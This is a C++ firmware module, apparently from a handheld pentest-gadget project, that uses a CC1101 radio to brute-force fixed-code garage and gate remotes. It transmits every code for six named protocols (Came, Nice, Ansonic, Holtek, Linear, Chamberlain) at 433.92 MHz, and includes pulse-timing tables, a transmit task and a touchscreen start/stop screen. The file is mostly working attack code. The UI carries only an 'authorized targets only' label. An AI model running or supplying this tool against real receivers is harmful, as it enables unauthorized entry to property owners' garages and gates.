#include "cc1101_bruteforce.h"
#include "cc1101_hw.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <Arduino.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <cstdio>

extern FeatureRegistry g_registry;

namespace Cc1101Bruteforce {
namespace {

struct HighLow { int high; int low; }; // signed durations: positive=HIGH us,
                                        // negative=LOW us -- same convention
                                        // as Bruce's real brute_protocols[]

struct ProtocolDef {
    const char *name;
    int bits;
    HighLow zero, one, pilot, stop;
};

// VERBATIM from ~/src/firmware/src/modules/rf/rf_bruteforce.h's real
// brute_protocols[] table (read directly for this port, 2026-08-25) -- do
// not re-derive these values from anywhere else.
constexpr ProtocolDef kProtocols[] = {
    {"Came 12bit",       12, {-320, 640},  {-640, 320},  {-11520, 320}, {0, 0}},
    {"Nice 12bit",       12, {-700, 1400}, {-1400, 700}, {-25200, 700}, {0, 0}},
    {"Ansonic 12bit",    12, {-1111, 555}, {-555, 1111}, {-19425, 555}, {0, 0}},
    {"Holtek 12bit",     12, {-870, 430},  {-430, 870},  {-15480, 430}, {0, 0}},
    {"Linear 10bit",     10, {500, -1500}, {1500, -500}, {0, 0}, {500, -21500}},
    {"Chamberlain 9bit", 9,  {-870, 430},  {-430, 870},  {0, 0}, {-3000, 1000}},
};

const ProtocolDef &def_for(Protocol p) { return kProtocols[(int)p]; }

struct TaskArgs {
    Protocol proto;
    float freq_mhz;
    int repeats;
};

volatile bool s_running = false;
volatile bool s_stop_requested = false;
volatile bool s_task_done = false;
volatile uint32_t s_code = 0;
volatile uint32_t s_total = 0;
const char *s_proto_name = "";

// Bruce's real sendPulse() (rf_bruteforce.cpp:36-44), ported verbatim: sign
// of the duration selects level, magnitude is the hold time.
inline void send_pulse(int pin, int duration) {
    if (duration > 0) {
        digitalWrite(pin, HIGH);
        delayMicroseconds(duration);
    } else if (duration < 0) {
        digitalWrite(pin, LOW);
        delayMicroseconds(-duration);
    }
}

// Same real crash class/fix as cc1101_replay.cpp and cc1101_jammer.cpp
// (2026-08-25, see cc1101_replay.cpp's own header comment for the full
// account): a full code-space sweep (up to 4096 codes * repeats * ~12 bits)
// runs comfortably past the task_wdt window with zero yields otherwise.
constexpr uint32_t kYieldIntervalUs = 500000;

void bruteforce_task(void *arg) {
    TaskArgs *args = static_cast<TaskArgs *>(arg);
    const ProtocolDef &proto = def_for(args->proto);
    int pin = Cc1101Hw::gdo0_pin();
    const uint32_t total = 1u << proto.bits;

    s_proto_name = proto.name;
    s_total = total;
    s_code = 0;

    uint32_t last_yield_us = micros();
    for (uint32_t code = 0; code < total && !s_stop_requested; code++) {
        if (micros() - last_yield_us > kYieldIntervalUs) {
            vTaskDelay(1);
            last_yield_us = micros();
        }
        for (int r = 0; r < args->repeats; r++) {
            if (proto.pilot.high || proto.pilot.low) {
                send_pulse(pin, proto.pilot.high);
                send_pulse(pin, proto.pilot.low);
            }
            for (int j = proto.bits - 1; j >= 0; j--) {
                const HighLow &hl = ((code >> j) & 1) ? proto.one : proto.zero;
                send_pulse(pin, hl.high);
                send_pulse(pin, hl.low);
            }
            if (proto.stop.high || proto.stop.low) {
                send_pulse(pin, proto.stop.high);
                send_pulse(pin, proto.stop.low);
            }
        }
        s_code = code;
    }

    digitalWrite(pin, LOW);
    Cc1101Hw::idle();
    delete args;
    s_task_done = true;
    vTaskDelete(nullptr);
}

} // namespace

void start(Protocol p, float freq_mhz, int repeats) {
    if (s_running) {
        Serial.println("quarky-tab5: [cc1101-bruteforce] start() REFUSED -- "
                        "already running");
        return;
    }
    if (!Cc1101Hw::is_present() && !Cc1101Hw::init()) {
        Serial.println("quarky-tab5: [cc1101-bruteforce] start() REFUSED -- CC1101 not present");
        return;
    }
    Cc1101Hw::set_frequency_mhz(freq_mhz);
    if (!Cc1101Hw::enable_async_tx()) {
        Serial.println("quarky-tab5: [cc1101-bruteforce] start() REFUSED -- enable_async_tx() failed");
        return;
    }
    pinMode(Cc1101Hw::gdo0_pin(), OUTPUT);
    digitalWrite(Cc1101Hw::gdo0_pin(), LOW);

    TaskArgs *args = new TaskArgs{p, freq_mhz, repeats < 1 ? 1 : repeats};
    s_stop_requested = false;
    s_task_done = false;
    s_running = true;

    // Same core-pinning/priority reasoning as cc1101_replay.cpp's
    // transmit_task -- microsecond-precision bit-bang, must not share a core
    // with LVGL's render tick.
    BaseType_t created = xTaskCreatePinnedToCore(
        bruteforce_task, "cc1101_bf", 4096, args, 5,
        nullptr, (ARDUINO_RUNNING_CORE == 0) ? 1 : 0);
    if (created != pdPASS) {
        delete args;
        s_running = false;
        Serial.println("quarky-tab5: [cc1101-bruteforce] xTaskCreatePinnedToCore() FAILED");
    }
}

void stop() {
    s_stop_requested = true;
}

// Forward-declared (same anonymous namespace reopened in the UI section
// below, same file) -- called from poll() so a single main.cpp::loop() call
// keeps both the engine state AND the open screen's progress bar/label in
// sync, without main.cpp needing a second per-feature UI-refresh call.
namespace {
void update_status_ui(const BruteforceStatus &st);
}

bool poll(BruteforceStatus *out) {
    if (s_task_done) {
        s_running = false;
        s_task_done = false;
    }
    BruteforceStatus st;
    st.running = s_running;
    st.protocol_name = s_proto_name;
    st.code = s_code;
    st.total = s_total;
    update_status_ui(st);
    if (out) *out = st;
    return s_running;
}

const char *protocol_name(Protocol p) { return def_for(p).name; }

// ── UI: protocol pick + progress/stop, matching Phase 2/5's established
// list-and-select / progress-and-stop screen pattern (see
// rf433_bruteforce.cpp for the existing on-device precedent this mirrors). ──
namespace {
lv_obj_t *s_status_label = nullptr;
lv_obj_t *s_progress_bar = nullptr;
lv_obj_t *s_start_btn = nullptr;
lv_obj_t *s_start_lbl = nullptr;
lv_obj_t *s_proto_dropdown = nullptr;
float s_ui_freq_mhz = 433.92f; // real common fixed-code-remote frequency,
                                // same default Poseidon/Bruce both use
bool s_ui_active = false;

const char *kDropdownOptions =
    "Came 12bit\nNice 12bit\nAnsonic 12bit\nHoltek 12bit\nLinear 10bit\nChamberlain 9bit";

void update_status_ui(const BruteforceStatus &st) {
    if (!s_status_label) return;
    char buf[96];
    if (st.running) {
        std::snprintf(buf, sizeof(buf), "%s: code %u / %u", st.protocol_name,
                      (unsigned)st.code, (unsigned)st.total);
        if (s_progress_bar && st.total > 0) {
            lv_bar_set_value(s_progress_bar, (int)((st.code * 100u) / st.total), LV_ANIM_OFF);
        }
    } else {
        std::snprintf(buf, sizeof(buf), "Idle");
    }
    lv_label_set_text(s_status_label, buf);
}

lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("CC1101 Bruteforce", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *note = lv_label_create(content);
    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
    lv_label_set_text(note, "Fixed-code bruteforce -- authorized targets only.");

    s_proto_dropdown = lv_dropdown_create(content);
    lv_dropdown_set_options(s_proto_dropdown, kDropdownOptions);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Idle");

    s_progress_bar = lv_bar_create(content);
    lv_obj_set_size(s_progress_bar, LV_PCT(100), 16);
    lv_bar_set_range(s_progress_bar, 0, 100);

    s_start_btn = lv_button_create(content);
    s_start_lbl = lv_label_create(s_start_btn);
    lv_label_set_text(s_start_lbl, "Start");
    lv_obj_add_event_cb(s_start_btn, [](lv_event_t *) {
        if (s_ui_active) {
            stop();
            lv_label_set_text(s_start_lbl, "Start");
            s_ui_active = false;
            return;
        }
        uint32_t sel = lv_dropdown_get_selected(s_proto_dropdown);
        start((Protocol)sel, s_ui_freq_mhz, 2);
        lv_label_set_text(s_start_lbl, "Stop");
        s_ui_active = true;
    }, LV_EVENT_CLICKED, nullptr);

    lv_obj_add_event_cb(content, [](lv_event_t *) {
        s_status_label = nullptr;
        s_progress_bar = nullptr;
        s_start_btn = nullptr;
        s_start_lbl = nullptr;
        s_proto_dropdown = nullptr;
        if (s_ui_active) { stop(); s_ui_active = false; }
    }, LV_EVENT_DELETE, nullptr);

    return screen;
}
} // namespace

void open_screen() { ScreenStack::push(build_screen()); }

void register_module() {
    g_registry.register_module({"cc1101_bruteforce", "CC1101 Bruteforce", Category::SUBGHZ,
                                 Affinity::TAB5_NATIVE, open_screen, nullptr});
}

} // namespace Cc1101Bruteforce
